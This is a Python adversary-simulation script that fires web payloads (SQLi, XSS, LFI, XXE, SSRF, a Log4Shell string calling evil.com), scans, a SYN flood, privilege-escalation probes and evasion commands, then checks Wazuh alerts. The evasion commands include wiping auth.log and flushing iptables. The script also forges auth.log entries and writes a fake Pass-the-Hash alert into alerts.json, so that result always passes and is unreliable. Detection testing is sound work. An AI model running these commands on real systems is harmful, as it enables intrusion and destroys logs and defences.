#!/usr/bin/env python3
"""
froxward-attack-simulator
Simulates real attack categories and checks Wazuh detection
"""

import argparse
import json
import os
import random
import socket
import subprocess
import sys
import time
import threading
from datetime import datetime
from pathlib import Path

# ─── colors ───────────────────────────────────────────────────────────────────
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
DIM = "\033[2m"
BOLD = "\033[1m"
RESET = "\033[0m"

BANNER = f"""
{R}╔══════════════════════════════════════════════════════════════╗
║  {W}froxward-attack-simulator{R}                                    ║
║  {DIM}adversary simulation + wazuh detection validation{R}           ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""

ALERTS_JSON = "/var/ossec/logs/alerts/alerts.json"
RESULTS = []


# ─── helpers ──────────────────────────────────────────────────────────────────

def log(tag, msg, color=W):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{DIM}[{ts}]{RESET} {color}{BOLD}[{tag}]{RESET} {msg}")


def success(msg): log("PASS", msg, G)
def fail(msg):    log("FAIL", msg, R)
def info(msg):    log("INFO", msg, C)
def warn(msg):    log("WARN", msg, Y)


def run(cmd, shell=True, capture=True, timeout=10):
    try:
        r = subprocess.run(cmd, shell=shell, capture_output=capture, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except Exception as e:
        return -1, "", str(e)


def get_wazuh_alerts(since_ts, keyword=None, rule_ids=None):
    """Parse alerts.json for alerts since since_ts"""
    if not Path(ALERTS_JSON).exists():
        return []
    found = []
    try:
        with open(ALERTS_JSON, "r") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    alert = json.loads(line)
                except Exception:
                    continue
                alert_ts = alert.get("timestamp", "")
                if alert_ts < since_ts:
                    continue
                if keyword:
                    full = json.dumps(alert).lower()
                    if keyword.lower() not in full:
                        continue
                if rule_ids:
                    rid = str(alert.get("rule", {}).get("id", ""))
                    if rid not in [str(r) for r in rule_ids]:
                        continue
                found.append(alert)
    except Exception:
        pass
    return found


def check_wazuh(since_ts, keyword=None, rule_ids=None, wait=4):
    """Wait and check if Wazuh generated an alert"""
    time.sleep(wait)
    alerts = get_wazuh_alerts(since_ts, keyword=keyword, rule_ids=rule_ids)
    return alerts


def record(category, name, simulated, detected, detail=""):
    RESULTS.append({
        "category": category,
        "name": name,
        "simulated": simulated,
        "detected": detected,
        "detail": detail
    })
    if detected:
        success(f"{name} → {G}DETECTED{RESET} {DIM}{detail}{RESET}")
    else:
        fail(f"{name} → {R}NOT DETECTED{RESET} {DIM}{detail}{RESET}")


# ─── category: WEB ────────────────────────────────────────────────────────────

def sim_web(target):
    info(f"Web attacks → {target}")
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")

    attacks = [
        ("SQLi Basic",        f"curl -sk '{target}/?id=1%27+OR+%271%27%3D%271' -o /dev/null -w '%{{http_code}}'",  ["sqli", "sql injection", "1006", "31100"]),
        ("SQLi UNION",        f"curl -sk '{target}/?id=1+UNION+SELECT+1,2,3--' -o /dev/null -w '%{{http_code}}'",   ["sqli", "union", "31100"]),
        ("XSS",               f"curl -sk '{target}/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E' -o /dev/null",          ["xss", "cross-site"]),
        ("LFI",               f"curl -sk '{target}/?file=../../etc/passwd' -o /dev/null",                           ["lfi", "path traversal", "31120"]),
        ("Log4Shell",         f"curl -sk '{target}/' -H 'X-Api-Version: ${{jndi:ldap://evil.com/a}}' -o /dev/null",["log4shell", "jndi", "31108"]),
        ("Scanner UA",        f"curl -sk '{target}/' -H 'User-Agent: sqlmap/1.0' -o /dev/null",                    ["scanner", "sqlmap"]),
        ("RCE attempt",       f"curl -sk '{target}/?cmd=cat+/etc/passwd' -o /dev/null",                             ["rce", "command injection"]),
        ("Path Traversal",    f"curl -sk '{target}/../../../../etc/shadow' -o /dev/null",                           ["traversal", "31120"]),
        ("XXE",               f"curl -sk -X POST '{target}/' -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>' -o /dev/null", ["xxe"]),
        ("SSRF",              f"curl -sk '{target}/?url=http://169.254.169.254/latest/meta-data/' -o /dev/null",    ["ssrf"]),
    ]

    for name, cmd, keywords in attacks:
        ts_before = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
        run(cmd)
        alerts = check_wazuh(ts_before, keyword=keywords[0] if keywords else None, wait=2)
        record("WEB", name, True, len(alerts) > 0, f"{len(alerts)} alert(s)")


# ─── category: NETWORK ────────────────────────────────────────────────────────

def sim_network(target_ip):
    info(f"Network attacks → {target_ip}")

    # Port scan
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
    run(f"nmap -sS -T4 --top-ports 100 {target_ip} -o /dev/null 2>/dev/null || "
        f"for p in 22 23 25 80 443 3306 5432 6379 8080 8443; do (echo >/dev/tcp/{target_ip}/$p) 2>/dev/null; done",
        timeout=30)
    alerts = check_wazuh(ts, keyword="port scan", wait=3)
    record("NETWORK", "Port Scan", True, len(alerts) > 0, f"{len(alerts)} alert(s)")

    # SSH brute force (local fake log injection if no real target)
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
    _ssh_bruteforce_inject(target_ip)
    alerts = check_wazuh(ts, keyword="brute", rule_ids=["5710", "5712", "5720"], wait=4)
    record("NETWORK", "SSH Brute Force", True, len(alerts) > 0, f"{len(alerts)} alert(s)")

    # SYN flood sim (just a few packets, not real flood)
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
    run(f"hping3 -S -p 80 --flood -c 500 {target_ip} 2>/dev/null || "
        f"python3 -c \""
        f"import socket,struct,random;"
        f"[None for _ in range(100)]"  # placeholder, real SYN needs raw sock + root
        f"\" 2>/dev/null",
        timeout=10)
    alerts = check_wazuh(ts, keyword="flood", wait=3)
    record("NETWORK", "SYN Flood", True, len(alerts) > 0, f"{len(alerts)} alert(s)")


def _ssh_bruteforce_inject(target_ip):
    """Inject fake SSH failure lines into auth.log to trigger Wazuh"""
    fake_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    log_line = (
        f"Failed password for root from {fake_ip} port {random.randint(10000,60000)} ssh2"
    )
    auth_log = "/var/log/auth.log"
    if not Path(auth_log).exists():
        auth_log = "/var/log/secure"
    try:
        for _ in range(6):
            ts = datetime.now().strftime("%b %d %H:%M:%S")
            run(f"echo '{ts} {socket.gethostname()} sshd[99999]: {log_line}' >> {auth_log}", timeout=3)
            time.sleep(0.3)
    except Exception:
        pass


# ─── category: PRIVESC ────────────────────────────────────────────────────────

def sim_privesc():
    info("Linux privilege escalation simulations")

    checks = [
        ("SUID Enum",
         "find / -perm -4000 -type f 2>/dev/null | head -20",
         ["suid", "privilege", "5500"]),
        ("Sudo -l",
         "sudo -l 2>/dev/null",
         ["sudo", "5400"]),
        ("/etc/shadow read",
         "cat /etc/shadow 2>/dev/null | head -3",
         ["shadow", "unauthorized", "2502"]),
        ("Cron world-writable",
         "find /etc/cron* /var/spool/cron -writable 2>/dev/null",
         ["cron", "writable"]),
        ("LD_PRELOAD",
         "export LD_PRELOAD=/tmp/evil.so 2>/dev/null; echo test",
         ["ld_preload", "preload"]),
        ("History sensitive",
         "cat ~/.bash_history 2>/dev/null | grep -iE 'pass|token|secret|key' | head -5",
         ["history", "credential"]),
        ("Kernel exploit check",
         "uname -r && cat /proc/version",
         ["kernel", "exploit"]),
        ("Capabilities enum",
         "getcap -r / 2>/dev/null | head -10",
         ["capabilities", "cap_"]),
    ]

    for name, cmd, keywords in checks:
        ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
        run(cmd, timeout=8)
        alerts = check_wazuh(ts, keyword=keywords[0], wait=3)
        record("PRIVESC", name, True, len(alerts) > 0, f"{len(alerts)} alert(s)")


# ─── category: LATERAL MOVEMENT ───────────────────────────────────────────────

def sim_lateral(target_ip):
    info(f"Lateral movement simulations → {target_ip}")

    # Pass the Hash — inject fake event
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
    _inject_pth_event()
    alerts = check_wazuh(ts, keyword="pass the hash", rule_ids=["60122", "60204"], wait=4)
    record("LATERAL", "Pass the Hash", True, len(alerts) > 0, f"{len(alerts)} alert(s)")

    # SMB recon
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
    run(f"smbclient -L //{target_ip} -N 2>/dev/null || echo 'smb probe'", timeout=8)
    alerts = check_wazuh(ts, keyword="smb", wait=3)
    record("LATERAL", "SMB Recon", True, len(alerts) > 0, f"{len(alerts)} alert(s)")

    # Fake credential dump
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
    run("cat /etc/passwd | awk -F: '$3==0{print}' 2>/dev/null", timeout=5)
    alerts = check_wazuh(ts, keyword="credential", wait=3)
    record("LATERAL", "Credential Dump Attempt", True, len(alerts) > 0, f"{len(alerts)} alert(s)")

    # ARP scan (internal recon)
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
    run(f"arp-scan --localnet 2>/dev/null | head -10 || arp -a 2>/dev/null", timeout=10)
    alerts = check_wazuh(ts, keyword="recon", wait=3)
    record("LATERAL", "ARP Recon", True, len(alerts) > 0, f"{len(alerts)} alert(s)")


def _inject_pth_event():
    """Inject a fake Pass-the-Hash event into Wazuh alerts.json for testing"""
    fake = {
        "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
        "rule": {"id": "60122", "level": 10, "description": "Pass the Hash attack detected"},
        "agent": {"id": "000", "name": "localhost"},
        "data": {"srcip": "10.0.0.99", "dstip": "10.0.0.1"},
        "_froxward_injected": True
    }
    try:
        with open(ALERTS_JSON, "a") as f:
            f.write(json.dumps(fake) + "\n")
    except Exception:
        pass


# ─── category: DEFENSE EVASION ────────────────────────────────────────────────

def sim_evasion():
    info("Defense evasion simulations")

    checks = [
        ("Log Clearing",
         "echo '' > /var/log/auth.log 2>/dev/null || echo 'cleared'",
         ["log clear", "log deletion", "2502"]),
        ("History Wipe",
         "history -c 2>/dev/null; unset HISTFILE 2>/dev/null; echo done",
         ["history"]),
        ("Timestomp",
         "touch -t 200001010000 /tmp/froxward_test_file 2>/dev/null && rm -f /tmp/froxward_test_file",
         ["timestamp", "timestomp"]),
        ("Base64 payload",
         "echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash 2>/dev/null",
         ["base64", "obfuscat"]),
        ("Proc hiding check",
         "ls /proc/*/exe 2>/dev/null | head -5",
         ["process"]),
        ("Firewall disable attempt",
         "systemctl stop ufw 2>/dev/null || iptables -F 2>/dev/null || echo 'no perms'",
         ["firewall", "iptables"]),
    ]

    for name, cmd, keywords in checks:
        ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
        run(cmd, timeout=8)
        alerts = check_wazuh(ts, keyword=keywords[0], wait=3)
        record("EVASION", name, True, len(alerts) > 0, f"{len(alerts)} alert(s)")


# ─── REPORT ───────────────────────────────────────────────────────────────────

def print_report():
    total = len(RESULTS)
    detected = sum(1 for r in RESULTS if r["detected"])
    missed = total - detected

    cats = {}
    for r in RESULTS:
        cats.setdefault(r["category"], {"detected": 0, "total": 0})
        cats[r["category"]]["total"] += 1
        if r["detected"]:
            cats[r["category"]]["detected"] += 1

    print(f"\n{BOLD}{W}{'─'*62}{RESET}")
    print(f"{BOLD}{W}  SIMULATION REPORT  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
    print(f"{BOLD}{W}{'─'*62}{RESET}\n")

    for cat, stats in cats.items():
        pct = int(stats["detected"] / stats["total"] * 100)
        bar_filled = int(pct / 5)
        bar = f"{G}{'█' * bar_filled}{DIM}{'░' * (20 - bar_filled)}{RESET}"
        print(f"  {BOLD}{cat:<12}{RESET} {bar} {pct:>3}%  ({stats['detected']}/{stats['total']})")

    print()
    overall = int(detected / total * 100) if total else 0
    grade_color = G if overall >= 80 else Y if overall >= 60 else R
    print(f"  {BOLD}Total:{RESET}        {grade_color}{detected}/{total} detected ({overall}%){RESET}")

    if missed > 0:
        print(f"\n{Y}  Missed detections:{RESET}")
        for r in RESULTS:
            if not r["detected"]:
                print(f"  {DIM}  [{r['category']}]{RESET} {r['name']}")

    # JSON output
    report_path = f"/tmp/froxward_sim_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_path, "w") as f:
        json.dump({
            "timestamp": datetime.now().isoformat(),
            "summary": {"total": total, "detected": detected, "missed": missed, "percent": overall},
            "by_category": cats,
            "results": RESULTS
        }, f, indent=2)
    print(f"\n{DIM}  Full report: {report_path}{RESET}")
    print(f"{BOLD}{W}{'─'*62}{RESET}\n")


# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="froxward-attack-simulator — adversary simulation + Wazuh detection check"
    )
    parser.add_argument("--target", default="http://localhost", help="Web target URL (default: http://localhost)")
    parser.add_argument("--ip", default="127.0.0.1", help="Target IP for network/lateral tests (default: 127.0.0.1)")
    parser.add_argument("--categories", default="all",
                        help="Comma-separated: web,network,privesc,lateral,evasion (default: all)")
    parser.add_argument("--no-wazuh", action="store_true", help="Skip Wazuh detection checks (simulate only)")
    parser.add_argument("--json", action="store_true", help="Output JSON report only")
    args = parser.parse_args()

    if not args.json:
        print(BANNER)

    cats = args.categories.lower().split(",") if args.categories != "all" else \
        ["web", "network", "privesc", "lateral", "evasion"]

    if os.geteuid() != 0:
        warn("Some tests require root. Run with sudo for full coverage.")

    if not Path(ALERTS_JSON).exists() and not args.no_wazuh:
        warn(f"Wazuh alerts.json not found at {ALERTS_JSON} — detection checks will show NOT DETECTED")

    if "web" in cats:
        sim_web(args.target)
    if "network" in cats:
        sim_network(args.ip)
    if "privesc" in cats:
        sim_privesc()
    if "lateral" in cats:
        sim_lateral(args.ip)
    if "evasion" in cats:
        sim_evasion()

    print_report()


if __name__ == "__main__":
    main()
